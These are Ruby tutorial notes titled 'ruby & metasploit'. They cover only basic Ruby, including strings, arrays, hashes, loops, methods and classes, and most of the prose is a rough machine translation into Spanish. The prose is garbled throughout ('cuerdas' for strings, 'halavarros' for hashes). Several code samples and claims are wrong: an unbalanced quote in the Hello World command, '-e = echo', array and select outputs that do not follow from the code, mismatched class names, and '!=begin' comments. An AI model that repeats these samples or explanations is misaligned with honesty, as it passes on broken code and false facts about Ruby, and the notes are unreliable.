# ruby & metasploit

## Ruby Essentials

```
Installation 

Data Types

Control Structures

Methods, Variables and Scope

Classes, Modules and Exceptions

```

### Installation and First Look

```
http://www.ruby-lang.org/
```

* Viene preinstalado en MAC y muchos Linux distros como Kali.
* en las ventanas se puede instalar: http://rubyinstaller.org/

Verify version:

```ruby
ruby -v
```

Update:

```ruby
apt install ruby_version
```

intérprete de ruby :

→ http://tryruby.org/

* Ruby From other language:

→ https://www.ruby-lang.org/en/documentation/ruby-from-other-languages/

#### Getting Started

```ruby
ruby -e "puts 'Hello World"
# Output: Hello World
```

// -e = echo (it shows the command directly) // puts = print

Puede ejecutar programas de Ruby interactivos utilizando la herramienta irb:

```ruby
irb --simple-prompt
```

#### Suggestions

* Si planea usar scripts Ruby de forma intensiva, le sugerimos que utilice el acceso directo de la exección bash (llamado **shebang**) si está utilizando el sistema basado en Linux o asocia los archivos Ruby en Windows.

Path of your Ruby interpreter:

```ruby
which ruby
```

> por lo tanto nuestro guión debe comenzar con el shebang

```
 #!/usr/bin/ruby
```

#### The power of Ruby

Lee archivos como cat:

```ruby
ruby -pe 0 'file'
```

// -pe 0 'file' = leer línea de archivo para imprimirlos en línea para stdout y Para cada línea ejecuta el comando 0

Contar el número de las líneas de un archivo:

```ruby
ruby -ne 'END {print "Lines:",$.,"\n"}' file

# -n = puts the code into a loop
# -e = execute one line of ruby code
# print = prints the following string to stdout without a new line at the end
# END = executes the next block of instructions
# $. = global variable that holds the last line number read by ruby interpreter
# . = used to concatenate strings
```

Reemplaza la minúscula por mayúsculas, y crea una copia de seguridad del original:

```ruby
ruby -i.bak -pe 'gsub "foo","FOO"' file_name

# -i = specifies in-place edit mode (edit each line read by -p instead of write it to stdout). If an extension is provided (.bak), ruby makes a backup of the original
# gsub = stands For global substitution (replace the first argument with the second)
```

> Le sugerimos que vea la página de hombre Ruby o la Ayuda

#### Libraries

* Hay diferentes fuentes de bibliotecas

→ el más famoso: http://rubygems.org/

* Es un sistema de envasado Ruby diseñado para facilitar la creación, el intercambio y la instalación de bibliotecas.
* Otras fuentes: RubyForge, GitHub, Ruby Toolbox

#### RubyGems

* gem help

Search For gems:

```ruby
gem search <string>
gem search -r http // -r = remote
```

Install the gem you want:

```ruby
gem install <gem name>
gem install openssl-extensions
gem install -h
```

List installed gems:

```ruby
gem list
```

Muy útil gem es **pry**

```ruby
gem install pry
// it provides an interactive environment with many interesting features such as syntax highlighting
pry --simple-prompt
```

#### Data Types

* todo es un objeto.

**Numbers**

```ruby

4.odd?
# Output: false
4.even?
# Output: true
10.next
# Output: 11
10.pred
# Output: 9
25.to_s
# Output: "25"
65.chr
# Output: "A"
15.integer?
# Output: true

```

> In general, if a method ends with the question mark, it means that the returning value is a boolean.

**Float**

```ruby

10/3.0
# Output: 3.3333
2.0.integer?
# Output: false
2.49.round
# Output: 2
2.51.round
# Output: 3
2.51.ceil
# Output: 3
2.51.floor
# Output: 2

```

**Anticipation**

* pygmentize ip\_upto.rb
* ruby ip\_upto.rb 192.168.1 10 20
* //will print 192.168.10\~20

#### Comments

```ruby

# Comments ...

!=begin
  comments in between
=end

```

#### Strings

* utilizar cotizaciones individuales y dobles

Una cita soporte de dos secuencias de escape:

```ruby
\' and \\
```

Las dobles citas apoyan mucho:

```ruby
\" = double quote
\r = carriage return
\s = space
\\ = single backslash
\n = newline
\t = tab
```

* También tenga en cuenta que en lugar de usar comillas dobles o simples, puede usar % (caracter %)

```
You can also use % with brackets, parenthesis, braces or <> signs.
```

* Usando comillas alternativas Ruby (% caracteres y delimitadores personalizados) puedes escribir cadenas que contengan comillas dobles o simples sin escapar de ellas.

```ruby
- With %q and %Q you can start respectively strings that works as delimited single ( ' ' ) and double quoted ( " " ) strings.
- both %q and %Q need a custom delimiter too and you can also use the special delimiters:

{},[],(),<>

print %q!Like single quote, \n is not interpreted as new line!
print %Q!Like double quote, \n is interpreted as new line!
```

**Info about strings**

* Puede definir la variable local con una letra minúe de caso o un carácter de subrayado (o) como primer carácter variable.

algunos ejemplos:

```ruby

st = "A string"

st.empty?
# Output: false
st.clear
# Output: ""
st.empty?
# Output: true
st = "Another string"
st.length
# Output: 14
st.size
# Output: 14
st.start_with? "An"
# Output: true
st.end_with? "ing"
# Output: true
st.start_with "an"
# Output: false
st.end_with? "String"
# Output: false
```

// Recuerda que una cuerda es un objeto. Puede utilizar todos los métodos públicos proporcionados por String y sus clases decestor. // usando **pry** puedes mostrarlos usando la función de autocompletar (presionando la tecla de pestaña)

**Here document notation**

* Heredoc proporciona un mecanismo Para crear cadenas de formato libre - preservando caracteres especiales como nuevas líneas y pestañas. Esto es muy útil si necesita utilizar cadenas multilínea.

Ejemplo:

```ruby
st = <<DELIMITER
  ... our 
  string,,,
DELIMITER

print st 
# will print the multi-line string

```

**string Arithmetic**

Diferentes formas de concatenar:

```ruby
# (+) Notation
str1 = "Hello"
str2 = "World"
result = str1 + " " + str2

# String Juxtaposition
str1 = "Hello"
str2 = "World"
result = str1 << " " << str2

# (<<) Notation
str1 = "Hello"
str2 = "World"
str1 << " " << str2

# OO Notation with concat Method
str1 = "Hello"
str2 = "World"
str1.concat(" ", str2)

```

Puedes repetir las cuerdas fácilmente y también congelarlas, para que no puedan ser alteradas:

```ruby

# Using * for repetition
"string" * 2
# => "stringstring"

# Using << for concatenation
st = "A Ruby"
st << " String"
# => "A Ruby String"

# Freezing a string
st.freeze
# => "A Ruby String"
# The string is now frozen and cannot be modified anymore

# Attempting to modify a frozen string will result in an error
st << "!!!"
# => FrozenError (can't modify frozen String)

```

* Freeze opera en un objeto, no en una variable que sujeta el puntero al objeto. Por lo tanto, su legal asignar un nuevo objeto a una variable que remite un objeto congelado. De hecho, estás trabajando con un nuevo objeto.
* Puedes probar si la cuerda se congela con el método **frozen?**.

**String substitution**

* \[index] El método puede cambiar fácilmente secciones de cuerdas.

```ruby

st = "We are using Perl"
st["Pearl"] = "Ruby!!!"
st
# Output: We are using Ruby!!!

```

* z way es **sub** y **gsub**

El primero sustituye a la primera ocurrencia, mientras que esta última sustituye a todas las ocurreciones.

```ruby
st.sub("Perl","Ruby")
```

* **sub** and **gsub** Sólo devuelva una copia de la cadena con la sustitución adecuada. Si desea modificar la cadena original, tienes que usar **sub** o **gsub**.\*\*\*\*.\*\*
* no puedes usar sub-gsub-gsub en un objeto congelado.

Puede insertar algún texto en una posición específica de una cadena:

```ruby
st = "bcde"
st.insert(0,"a")
# Output: abcde
```

> \-3, funciona como pitón. Cuenta desde el final.

**Interpolation**

* Permite escribir código Ruby en una cadena. Esto significa que puede poner cualquier código que desee ejecutar encerrado

```
ruby#{}
```

Y el resultado del código aparecerá en la cadena:

```ruby
"string #{Ruby code} string"
example:

#{2*4} apples on the tree
 # Output: "8 apples on the tree"

name ="john"
# Output: "My name is #{name}" 
# just like python fstring
```

**Some useful methods**

* Son tiempos que usted puede tener que hacer algunas operaciones simples con texto o cadena
* upcase, capitalización, inverso, y así es así

### Array

* Un array Ruby es un objeto que contiene otros objetos a los que se puede acceder usando índices enteros. Una matriz puede incluir todo tipo de objetos, incluyendo otras matrices (esto se llama matriz multidimensional).

```ruby
my_array = Array.new(2)
my_array[0] = 5
my_array[0] = 9
my_array
# Output: [5,9]
my_array<<7 
my_array
# Output: [5,9,7]
```

// se puede acceder a través de índices // puede tener múltiples capas de matrices // cambiando una variable dentro del array, también cambia la matriz/variable y viceversa

#### Insertions

* se puede hacer a través de operador de 'o' // como bash
* también con rangos \[..]

#### Deletion

```ruby
a.delete(4) 
# through element

a.delete_at(2) 
# through index position
```

#### concatenation

* Puedes concatenar arrays con **-** operador o un estilo OO con método **.concat**.

#### Operations between arrays

Puedes tratar una matriz como un conjunto y realizar operaciones como:

```ruby
# Union ( | ): concatenates two arrays (removing duplicates)
# Intersection ( & ): Only elements that are common to both arrays are returned (removing duplicates)
# Difference ( - ): returns the first array without the elements contained into the second array

# Example:

arr1 = [1, 2, 3]
arr2 = [3, 4, 5]

# Union (|)
union_result = arr1 | arr2
puts "Union: #{union_result}"

# Intersection (&)
intersection_result = arr1 & arr2
puts "Intersection: #{intersection_result}"

# Difference (-)
difference_result = arr1 - arr2
puts "Difference: #{difference_result}"

# Output:
# Union: [1, 2, 3, 4, 5]
# Intersection: [3]
# Difference: [1, 2]

```

#### stack

* Ruby arrays proporcionan métodos **push** y **pop**

#### Some useful methods

Además, la clase de array proporciona una gran cantidad de métodos interesantes y útiles, tales como:

```ruby
sort
reverse
uniq
max
min
```

* Tenga en cuenta que algunos métodos vienen con y sin el punto de exclamación ( )
* por lo tanto, cuando se hace, afecta también a la variable original/objeto

#### Arrays and Strings

* Puede crear fácilmente una cuerda a partir de un Array (y viceversa) usando el método \*\* unin\*\*.
* y para crear una matriz a partir de una cuerda utilizando el método **split** // al igual que la pitón

→ moreover: http://www.ruby-doc.org/core-1.9.3/Array.html

#### References

→ http://www.ruby-doc.org/core-1.9.3/

### Ranges and Hash

* Ruby Ranges permite que los datos se representen en forma de rango. Puede crear diferentes rangos de valores: números, caracteres, cadenas u objetos en general
* Una gama está hecha de un valor inicial, un valor y un rango de valores en el medio.

Dos maneras de crear rangos:

```ruby
the inclusive (a..b) 
# 2 dots - it includes all values
the exclusive (a...b) 
# 3 dots - it excludes the last value (in this case 'b')
```

Ejemplo:

```ruby
(2..4).to_a // to_a = means to array
# Output: [2,3,4]

(2...4).to_a
# Output: [2,3]

# the same with letters
# differents data types supports differents methods

example float:
(1.0..3.0).step.to_a //without step it bugs
# Output: [1.0, 2.0, 3.0]
```

Another methods:

```ruby
min
max
begin
end
etc
```

Puede comprobar si un valor pertenece a la gama utilizando el método **include** o el **operador ===**

```ruby
(2..10).include?(4)
# Output: true

(2..10) === (14)
# Output: false
```

> Ranges también se puede expresar usando variables

```ruby
a = 5
b = 10
a..b
 # Output: 5..10

(a..b).to_a
 # Output: [5,6,7,8,9]
```

#### Hashes

* parecidos a los arrays. La principal diferencia es que los halavarros son como los diccionarios, así que en lugar de usar índices enteros

Puede utilizar un índice de objeto como clave:

```ruby
character
string
regex
symbols
and so on
```

* Obviamente el valor de un elemento hash puede ser de cualquier tipo
* para definir un hash que debe usar \*\*\*\* en lugar de **\[]**
* La sintaxis en línea le permite crear un hash muy rápidamente utilizando el operador **=**. El valor a la izquierda del operador es el índice de objeto mientras que lo que sigue son sus valores.
* Para evitar citas en las llaves de hachís, Ruby permite valores clave basados en símbolos:

→ http://ruby-doc.org/core-1.9.3/Symbol.html

* Los símbolos son una característica particular en Ruby. Generalmente son un tipo de datos, pero Ruby los maneja de una manera especial.
* Una forma sencilla de usarlos es añadiendo un colon (:) antes del nombre clave (que se convierte en un símbolo).

Tenga en cuenta que no hay comillas:

```ruby
hash = {:name => 'Bob', :age => 25, :gender => 'M'}
hash[:name]
# Output: "Bob"

Can be used a rapid notation (KEY:VALUE)
 → hash = {name: 'Bob', age:25, gender:'M'}
# but does not work For integer key value
```

→ moreover: http://www.ruby-doc.org/core-1.9.3/Hash.html

### Basic Control Structures

→ http://ruby-doc.org/docs/keywords/1.9/Object.html

#### Comparison Operator

\| operator | description | | == | Equality operator | | .eql? | Equality operator (OO style) | | != | Inequality operator | | < | less than | | > | greater than | | <= | less than or equal to | | >= | greater than or equal to |

\| a <=> b | | 0 - if a == b | | 1 - if a > b | | -1 - if a < b |

#### Conditionals

```ruby
if x > 5 then
  puts "\ngreater than 5\n\n"
end
if x < 20
  puts "less than 20\n\n"
end

# we can use else also
# and elsif // like python
```

```ruby
x = 10
puts "x is integer \n" if x.is_a? Integer
# Output: x is integer
```

* Todo es una expresión. Expresiones como la impresión o las trampas también tienen un valor de retorno (en este caso sí)

#### Unless

* A menos que el esteamiento sea lo opuesto a si. Ejecuta el código asociado sólo si la declaración de la expresoin condicional falsa o nula.

#### Case

* Las declaraciones de caso son un sustituto válido Para if/elsif
* Se pone a prueba en orden cada uno cuando se establece una cláusula hasta encontrar una condición que devuelve la verdad; de lo contrario, se ejecuta la última otra cosa.

```ruby
x=1
case x
when 1 then print "one"
else print "I dont know"
end

x=1
name = case x
when 1 then print "maria"
else print "I dont know"
end

x=1
name = case
when x == 1 then print "luna"
else print "I dont know"
end
```

* El operador de igualdad **===** is useful to work in Ranges.

También con las clases y casos:

```ruby
String == "Hello"
# Output: false
String === "Hello"
# Output: true
```

#### Ternary Operator

```ruby
>> test_expr? true_expr : false_expr
>> name == "Bob" ? "Hi Bob" : "Who are you?"
```

#### Loops

While:

```ruby
while <expression>
  <..block> 
end
```

> la palabra clave **do** se requiere con inline basic mientras que statement en su lugar

```ruby
print i+=1, "\s" while i < 5

print array.pop,"\s" while !array.empty?
```

Until:

```ruby
until <expression>
  <block>
end
```

> la palabra clave **do** se requiere con inline basic mientras que statement en su lugar

For:

```ruby
for <var> in <collection>
  <block>
end

for x in [10,20,5] do
  print i*2."\s"
end

- with range
for i in 1..10
  print i*2,"\s"
end
```

#### Iterators

Es un método que le permite bucle a través de los miembros de una colleción:

```ruby
(1..5).each { |i| print i*2,"\s"}
# Output: 2 4 6 8 10

(1..5).each  do |c|
  print i*2,"\s"
# Output: 2 4 6 8 10
```

#### Enumerable Objects

* Otros objetos enumerables comunes son Arrays, Hashes y Ranges.
* estamentos como recoger/mapa, seleccionar, rechazar, inyectar también
* cada uno de ellos puede utilizarse para modificar la colección original (sólo añadiera la marca de exclamación al final del método) o para crear una nueva colección a partir del original.

\*\* Las declaraciones de Colección/mapa\*\* son sinónimos:

```ruby
array = [1,2,3]
array.map {|x| x**2}
# Output: [1,4,9]
```

**select** devuelve una matriz de los elementos de colección originales Para los que el bloque asociado devuelve un valor positivo (no falso, no nulo)

```ruby

- array.select { |x| x>2}
# Output: 3,4,5
```

* **reject** es lo contrario de seleccionar. devuelve una matriz de elementos de colección originales Para el cual el bloque asociado devuelve un falso o nulo.
* **inject** - El bloque asociado a inyectarse tiene dos argumentos. el primero es un acumulador de la iteración anterior, mientras que el segundo es el siguiente elemento del objeto enumerable.

```ruby
array = [ 2,3,4,5,6,7]
array.inject {|mul,x| mul * x}
 # Output: 5040
```

* el mul su el acumulador, por lo que va a salvar cada uno de los resultados y seguir multiplicándose hasta que la lista haya terminado
* El valor del acumulador es el valor inicial de la lista, pero puede especificarse con soportes redondo ( )

```ruby
array = [ 1,2,3,4,5]
array.inject(100) {|sum,x| sum + x}
 # Output: 115
```

#### Enumerator

* es un objeto cuyo propósito es enumerar otro objeto enumerable. Esto significa que los enumeradores también son enumerables.
* cuando usamos cada uno, mapa, seleccione, etc., también utilizamos enumeradores implícitamente.
* uso: ejemplo, si tienes un método que utiliza un objeto enumerable, es posible que no querer pasar el objeto de colección enumerable porque su mutable y el método pueden modificarlo.
* Así que puedes pasar un enumerador creado con **to-enum** y no pasará nada a la colección enumerable original.
* moreover: http://ruby-doc.org/core-1.9.3/Enumerator.html

#### External Iterators

* También existe la posibilidad de utilizar un objeto enumerador como iterador externo.
* Objetos de enumerador te permiten controlar la iteración por ti mismo para que puedas crear lo que se llama iterador externo.

Ejemplo:

```ruby
 → [1,2,3,4]
enum = a.to_enum
enum.next
# Output: 1
enum.next
 # Output: 2
enum.next
# Output: 3
enum.next
 # Output: 4
enum.next
# Output: error
```

### Altering Structured Control Flow

Como otros programando languagues, en Ruby podemos usar:

```ruby
break
next
redo
```

* **break** transferir el control fuera del bucle o el iterador donde está contenido.
* if true, la siguiente operación es la primera declaración después de la palabra clave final.

```ruby
For i in 1..10
	print i,"\s"
	break if i==5
end

# Output:  1 2 3 4 5
```

* **next** La declaración termina la iteración actual y salta a la siguiente. Todas las instrucciones que siguen no se ejecutan. Funciona de la misma manera de continuar la declaración utilizada en Java o C.

```ruby
For i in 1..10
	next if i==5
	print i,"\s"
end

# Output: 1 2 3 4 6 7 8 9 10
```

* **Redo** reinicia la iteración actual de la primera instrucción en el cuerpo del bucle o iteración

```ruby

sum = 0
For i in 1..3
	sum +=i
	redo if sum == 1
end

 # Output: 7
 # 1 + 1 + 2 + 3 = 7 >> the 1 repeats because of the redo
```

#### Begin / End

* BEGIN permite la ejecución del código Ruby al comienzo de un programa Ruby
* END permite la ejecución de código Ruby al final de un programa Ruby

```ruby

BEGIN {
  puts "\n","Beginning code","\n"
}
END {
  puts "\n","Ending code","\n"
}

puts "\n","Normal code","\n"

```

Output:

```ruby
 → Beginning code
 → Normal code
 → Ending code
```

> Si hay más de un bloque BEGIN, se ejecutan siguiendo el orden en que el intérprete de Ruby los encista.

> END bloque en su lugar, se ejecutan en el orden inverso en el que se encuentran

### Methods

* Los métodos son una estructura común - disponible en todos los lenguajes de programación de alto nivel.
* Se utilizan para definir la abstracción de código, proporcionando un semántico específico (qué pueden hacer) pero ocultando la implementación (el código necesario para obtener el semántico)

#### Simple method definitions

Syntax:

```ruby
def <method name> (<arguments list>)
  ...<code block>...
end
```

// arguments list - can be empty

```ruby
def double (x)
  return x*2
end

double(2)
# Output: 4
```

#### Parentheses

Ruby es flexible, permite omitir los paréntesis cuando invocas un método (un espacio requerido entre el nombre del método y el argumento)

```ruby
fibonacci(5)
fibonacci 5
# both are correct
```

#### Alias

* Ruby permite definir alias para métodos
* Esto es útil si quieres tener un método con un nombre más natural o expresivo

```ruby
def method_in_ruby
  puts "whatever"
end
```

```ruby
alias mir method_in_ruby

mir
# Output: "whatever"
```

> Las aleas se utilizan comúnmente como copia de seguridad para ampliar la capacidad o funcionalidad de un método

#### Parameters Default Values

You can specify default values For parameters of your methods. These values will be assigned when an actual parameter will be omitted.

```ruby

def print_name(name = "unknown")
	print "\s",name,"\s"
end

print_name "john"
# Output: john
print_name # <anything as parameter>
# Output: unknown # <the method grab the default value>
```

#### Variable Length Arguments

* puede crear un método que sea capaz de manejar los argumentos de longitud variable como parámetros
* U tiene que añadir un \* antes de uno (y sólo uno) de los parámetros de su método
* Entonces puedes llamar al método con los argumentos que quieras.
* El parámetro con \* los captura como una matriz

Ejemplo:

```ruby
def method (first, *others)
  puts "first is: "+first.to_s
  print "others: "+others.to_s
end

method(1,2,3)
  first: 1
  others: [2,3]
```

#### Hashes as Arguments

* con hashes, puede invocar un método que especifica explícitamente (en el momento de la llamada) el nombre de los argumentos.
* Por lo general, este estilo de programación es ideal cuando tienes símbolos como valores clave de hash. Por lo tanto Ruby proporciona una sintaxis elegante y útil.

Example:

```ruby
def printPerson(hash)
  name = hash[:name] || "Unkown"
  age = hash[:age] || "Unkown"
  gender = hash[:gender] || "Unkown"
  print name, "\s",age,"\s",gender
end

printPerson name:"ana",age:27
# Output: Ana 27 Unknown
```

#### Block Arguments

* Dentro del método, podemos invocar el código en el bloque con la declaración **yield**.
* Iteradores lo haz para nosotros en silencio.
* El rendimiento transfiere el flujo de control al bloque asociado con la invocación del método

Ejemplo 1:

```ruby
def method
  puts "inside method"
  yield
  puts "Again inside method"
  yield
end

method {puts "In the BLOCK now" }
```

output:

```ruby
 → Inside method
 → In the BLOCK now
 → Again inside method
 → In the BLOCK now
```

* Puedes pasar discusiones con rendimiento y usarlos en el bloque

Example 2:

```ruby

def double(x)
  yield 2*x
end

double(5) { |x| print x }
# Output: 10=>nil
double(5) { |x| puts x }
# Output: 10
double(5) // without block 
# Output: error
```

* Rendimiento se utiliza a menudo con iteración
* Este método de ejemplo genera todos los números pares que son menos que n y el bloque los imprime a stdout.

Example:

```ruby
def even(n)
  for i in 2..n
    yield i if i % 2 == 0
  end
end


even(10) {|x| print x, "\s"}
  2 4 6 8 10 => 2..10
```

* si no quieres usar el rendimiento, Ruby te permite pasar un bloque como argumento. Con esta estrategia, el bloque se convierte en una instancia de la clase Proc y tienes que usar la llamada en lugar de ceder para transferirle el control.
* Para especificar que un argumento será un objeto Proc que encapsule un bloque debe utilizar el ampersand (&) en la definición del método.

Ejemplo 1:

```ruby
def square_cube(n,&p)
  For i in 1..n
	  p.call(i**2) # or yield i**2
	  p.call(i**3) # or yield i**3
  end
end

square_cube(5) {|x| print x,"\s"}
	1 1 4 8 9 27 16 64 25 125 => 1..5
```

* Proc objeto como valores de argumento normales

```ruby
square = Proc.new {|x| print x**2,"\s"}

def print_proc(n,pr)
  for i in 1..n
	  pr.call(i)
  end
end

print_proc(8,square)
# Output: 1 4 9 16 25 36 49 64 => 1..8
```

#### Bang methods

* Son métodos que terminan con una marca de exclamación \*\*\*\*
* modifican el objeto que se llama.
* Usualmente los métodos comunes de golpe están relacionados con Array o Hash.

#### Returned Values

Si devolvemos más de un valor, se convirtió en una matriz automáticamente:

```ruby
def ret_value
  return 1,2,3,4
end
array = ret_value
	[1,2,3,4]
array
	[1,2,3,4]

```

### Variables & Scope

* Ruby es un lenguaje mecanografiado dinámicamente: u puede crear una variable sin especificar su tipo.
* Deduce el tipo del tipo de objeto u asignado
* u puede cambiar el tipo de variable cambiando su tipo de objeto referenciado

Hay 4 tipos de variables en Ruby:

```ruby
local: visible within a method or block
global: visible throughout a Ruby program
instance: visible within an object instance
class: visible within all class instances
```

#### Local variables

* comenzar con una letra minúscula o un subrayado \*\*\*\*
* son visibles en una zona local específica del código fuente Ruby (método, clase, módulo).
* Declaraciones como Porque, Mientras tanto, iF, etc. no definen un nuevo alcance. Las variables definidas en su interior todavía son accesibles fuera.

→ kernel statements - http://ruby-doc.org/core-1.9.3/Kernel.html

* define new scope

Ejemplo: loop

Las siguientes estructuras de control definen un nuevo alcance:

```ruby
def ... end
class ... end
module ... end
loop { ... }
proc { ... }
iterators/method blocks
the entire script
```

> u puede verify the scope of a variable by using the **define?** method

#### Global variables

* comienza con el carácter especial **$**. Tiene un alcance global, lo que significa que puede ser visible y accesible. en cualquier lugar del programa.

Algunas variables globales predefinidas. Algunos ejemplos:

```ruby
$* : array of command line arguments
$0 : name of the script being executed
$_ : last string read by gets
 → moreover: http://ruby-doc.org/core-2.0/doc/globals_rdoc.html
```

Example: lee una línea y la imprime:

```ruby
print "write something: \t"
$stdin.gets
print "gets: \t\t\t",$_
puts
```

#### Instance & Class Variables

* las variables de clase comienzan con el . y son visibles por todas las instancias de una clase
* las variables de instancia comienzan con . Son locales a instancias específicas de una clase

#### Constants

* Empiece con una mayúscula. THey no debe ser cambiado después de su inicialización
* Sin embargo Ruby permite cambiarlos pero con una advertencia
* Pertenece al alcance

Ejemplo:

```ruby
A = 100
module B
  A = 200
end

A
# Output: 100
B::A
# Output: 200
// we can access the constant of the module by using its namespace B::A
```

Otro ejemplos mundiales:

```ruby
ARGV : holds command line arguments
ENV : holds information about environment
// moreover: http://ruby-doc.org/core-2.0/doc/globals_rdoc.html
```

#### tricks

Podemos declarar múltiples variables:

```ruby
   → a,b,c = "a","b","c"
```

Cótate dos variables sin utilizar una temporal:

```ruby
x=10
 y = 20
x,y=y,x
```

### Classes Principles

Cómo definir una clase:

```ruby
class <Name>
  ...<class body>...
end
```

```ruby
 <Name> must begin with a capital letter. This holds because Ruby creates the constante <Name> to refer the class, so the capital letter is required.
```

Crear una clase:

```ruby
class Myclass
  def hello
	print "Hello"
  end
end

// instantiate an object
MyObj = MyClass.new

// invoke an object method
MyObject.hello
# Output: Hello
```

→ moreover: http://ruby-doc.org/core-1.9.3/Class.html

#### Instance Variables

* son variables disponibles sólo a cada instancia de la clase, lo que significa que cambian de objeto a objeto.
* se definen dentro de la definición de clase utilizando el carácter especial.
* variable de instancia sólo se puede acceder a través de los métodos públicos en los casos. Así que tienes que definir métodos de accesoros para leerlos y métodos de setters para establecerlos.

Para inializarlos, el método de constructor predeterminado en Ruby es **inicializar**

```ruby

class MyClass
  #constructor method
  def initialize(a)
	  @a = a
  end
  # setter method
  def a=(value)
	  @a = value
  end
  # getter method
  def a
	  @a
  end
end
```

// Todas las instancias de MyClass tienen su propia variable de instancia (a) que es accesible gracias al getter y el método de setter 'a'.

* las variables de instancias se resuelven en el contexto de **self**. Cuando invocamos un método, el yo se refiere a una instancia de una clase. De lo contrario, dentro de un método de clase pero descaro, el yo es el objeto que representa la clase,

#### Getter / Setter through Metaprogramming

* con la palabra clave **attr-accessor**, Ruby define silenciosamente un getter y un setter Para nosotros.
* requiere una notación de símbolo, pero define variables de instancia reales .x,

```ruby
class QuickGS
  attr_accessor :x,y
end
obj = QuickGS.new

obj.x, obj.y = 100,300
print obj.x" " obj.y
# Output: 100 300
```

> con la palabra clave **attr-reader**, Ruby difunde silenciosamente un getter.

```ruby
class QuickG
  attr_reader :x,y
  def initialize(x,y)
	@x,@y = x,y
  end
end
obj = QuickG.new(10,20)
```

* podemos imprimir, pero no podemos establecer
* porque el setter no se ha definido
* **Attr** es otra palabra clave útil

Si se usa solo, define a un getter mientras que con la verdad define un setter también:

```ruby
class QuickGS
  attr :x,true
  attr :y
  def initialize(x,y)
	@x,@y = x,y
  end
end
obj = QuickGS.new(10,20)

obj.x = 100
# Output: 100
obj.y = 200
# Output: error
```

#### Class Methods

Self se refiere al objeto actual:

```ruby
class C1
  def self.say
	print "hello"
  end
end
c1.say
# Output: hello

```

* Dado que una clase es un objeto, podemos definir variables de instancia de objetos de clase con getter y setter también.
* Los métodos de clase pueden definirse de otras pocas maneras:

Usando el nombre de clase en lugar de **self** keyword

Usando la anotación \*\*\*\*

> the **<<** la notación es útil cuando u trabaja con clases que ya se han definido.

#### Class Variables

* debe empezar con @@ y sus compartidos entre todas las instancias de clase

#### Class Contants

Son accesibles desde el exterior usando **::notation**

```ruby
class MyClass
  C1 = "hello"
MyClass::C1
# Output: hello
```

#### Open Classes

* Generalmente en los idiomas OO convencionales, cuando cierras la definición de clase no puedes añadir nada más en ella, a menos que utilices alguna técnica avanzada y herramientas como reflexión

Ruby permite abrir una clase definida para añadir otros métodos, constantes, etc

```ruby
class String
  def dsize
	self.size * 2
  end
end
"Hello".size
# Output: 5
"Hello".dsize
# Output: 10
// the string class already exists, the method dsize is added to it.
```

#### Operator Methods

* La clase de puntos representa un punto simple en la geometría euclidiana.

Ejemplo:

```ruby
p1(1,2) - p2(10,20)
p1 + p2 = p3(11,22)
```

* La suma de dos puntos devolverá un nuevo punto que contiene la suma de las coordenadas x y y

```ruby
class Point
  attr :x,:y
	
  def initialize(x,y)
    @x,@y=x,y
  end
  def +(other)
    Point.new(@x+other.x,@y + other.y)
  end
end
```

// dos coordenadas (x,y). cada una de ellas tiene un getter // no hay setter u otro método para cambiarlos

#### Mutable / Immutable values

* En el ejemplo anterior de Punto, utilizamos Point como valores inmutables
* Esta nueva clase Point crea un valor de objeto mutable. Cada coordenada tiene su propio setter

```ruby
class Point
  attr_accessor :x, :y
  
  def initialize(x, y)
    @x, @y = x, y
  end

  def +(other)
    @x += other.x
    @y += other.y
    self
  end
end

```

* El operador \*\*\*\* cambia el primer objeto y lo devuelve como resultado.
* Un valor de Punto puede cambiar sus valores de coordenadas utilizando tanto los fijadores como la operación \*\*\*\*.

### Method Visibility

* Ruby permite u definir métodos protegidos y privados también

#### Private Methods

* u cdefinir métodos de instancia privada y métodos de clase privada
* Los métodos de instancia privada sólo pueden llamarse por otros métodos de instancia de la clase (y subclase). No puedes llamarlos desde fuera de un objeto.

Un famoso método de instancia privada Ruby es **inicial**. U no puede llamarlo desde fuera:

```ruby
obj.initialize > error
```

* **initialize** es una excepción porque en Ruby todos los métodos son públicos por defecto
* Los métodos de instancia privada se definen usando la palabra clave **privada**. Con uso sin argumentos, todos los métodos de sumo esta palabra clave son privados

Example 1:

```ruby
class AClass
  # Public methods
  def getName
    privateName
  end

  private
  # Private methods below
  def privateName
    "I'm AClass"
  end
end

```

Example 2:

```ruby
# u can specify which methods to treat as private

class AClass
  # Public methods
  def getName
    privateName
  end

  def privateName
    "I'm AClass"
  end

  # Specify private methods
  private :privateName
end

```

* si quieres especificar los métodos de clase como privados
* u puede utilizar la palabra clave \*\*private-class.

#### Protected Methods

* Los métodos protegidos funcionan como métodos privados, pero los métodos protegidos pueden ser llamados por cualquier instancia de la clase definitoria o sus subclasas.

#### A full view

```ruby
class ComplexClass
  # Public instance methods

  protected
  # Protected instance methods

  private
  # Private instance methods

  class << self
    # Public class methods

    protected
    # Protected class methods

    private
    # Private class methods
  end
end

```

* Los métodos privados no son una forma segura de ocultar algo. Una técnica diferente como la metaprogramación (vía método de envío) o la API de reflexión permite eludir los métodos privados/protegidos

→ moreover reflection API = http://en.wikipedia.org/wiki/Reflection\_(computer\_programming)

### Subclassing & Inheritance

* Un mecanismo para extender una clase con el fin de modificar su comportamiento o añadir nuevas funcionalidades: subclasificar
* Una clase puede tener múltiples subclases, pero las clases en general sólo pueden extender una clase (una clase tiene una sola superclase).
* Cuando se define una nueva clase, si no se especifica nada, amplía automáticamente la clase Objeto.
* La Clase Objec extiende otra clase de utilidad Ruby: BasicObject
* Por lo tanto, la clase raíz en Ruby es BasicObject

#### Simple extensions

```ruby
- Extending a class is very simple, just use the **<** operator. 
- A class inherits all superclass methods
```

```ruby
class Person
  attr_reader :name

  def initialize(name)
    @name = name
  end
end

class Italian < Person
end

marco = Italian.new("Marco")
puts marco.name
# Output: Marco

```

#### Methods Overriding

* subclastar es Ruby está fuertemente desalentada si no conoces bien la superclase que quieres extender
* u podría anular algunos métodos privados que son fundamentales Para que la clase funcione correctamente
* Para anular un método, simplemente definelo en la subclase.
* Un método anúlgado común es **es** = a string

De forma predeterminada, una clase extiende la clase Objeto y eso es un método que la clase de Objetos sostiene:

```ruby
class Italian < Person
  def to_s
    "Sono #{name}"
  end
end


marco = Italian.new("Marco")
marco.to_s
# Output: Sono Marco
```

#### Specialize a Method

* La palabra clave **super** nos ayuda a evitar la redefinición completa del comportamiento del método
* con súper, u puede llamar al método de la superclase

u puede utilizar súper con o sin argumentos:

```ruby
class Vehicle
  def initialize(type)
    @type = type
  end

  def to_s
    "I'm a #{@type} vehicle"
  end
end

class Car < Vehicle
  def initialize
    super("land")
  end

  def to_s
    super + ". I'm a car"
  end
end

```

